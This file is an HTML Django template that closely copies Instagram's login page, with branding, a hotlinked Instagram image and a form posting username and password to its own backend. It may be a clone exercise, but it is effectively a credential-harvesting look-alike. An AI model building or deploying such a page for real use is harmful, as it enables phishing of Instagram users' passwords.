<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login â€¢ Instagram</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://kit.fontawesome.com/cb792c0850.js" crossorigin="anonymous"></script>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }

        .instagram-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 935px;
            padding: 30px 0;
        }

        .instagram-phone {
            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png') no-repeat;
            background-size: 454px 618px;
            background-position: 0 0;
            height: 618px;
            width: 454px;
            flex-shrink: 0;
            margin-right: 30px;
        }

        .instagram-login-section {
            width: 350px;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px 0;
            text-align: center;
            margin-bottom: 10px;
        }

        .instagram-logo {
            font-family: 'Billabong', Arial, sans-serif;
            font-size: 50px;
            margin: 20px 0;
            color: #262626;
        }

        .login-form {
            padding: 0 40px;
        }

        .form-control {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            margin-bottom: 10px;
            padding: 10px;
            font-size: 12px;
        }

        .btn-login {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            font-weight: 600;
            margin-top: 10px;
        }

        .btn-login:disabled {
            background-color: #b2dffc;
        }

        .or-divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
        }

        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .or-divider span {
            padding: 0 20px;
            font-size: 13px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            margin-top: 20px;
        }

        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px;
            text-align: center;
            margin-top: 10px;
        }

        @media (max-width: 875px) {
            .instagram-container {
                flex-direction: column;
            }

            .instagram-phone {
                display: none;
            }
        }
    </style>
</head>

<body>
    <div class="instagram-container">
        <div class="instagram-phone"></div>
        <div class="instagram-login-section">
            <div class="login-box">
                <h1 class="instagram-logo">Instagram</h1>

                {% if invalid %}
                <div class="alert alert-danger" role="alert">
                    {{ invalid }}
                </div>
                {% endif %}

                <form class="login-form" method="post">
                    {% csrf_token %}
                    <input type="text" class="form-control" name="fnm" placeholder="Username or email" required>
                    <input type="password" class="form-control" name="pwd" placeholder="Password" required>

                    <button type="submit" class="btn btn-login">Log In</button>
                </form>

                <div class="or-divider">
                    <span>OR</span>
                </div>

                <div class="facebook-login">
                    <i class="fab fa-facebook-square"></i> Log in with Facebook
                </div>

                <div class="forgot-password">
                    <a href="#" class="text-decoration-none" style="color: #385185;">Forgot password?</a>
                </div>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="/signup" style="color: #0095f6;">Sign up</a>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
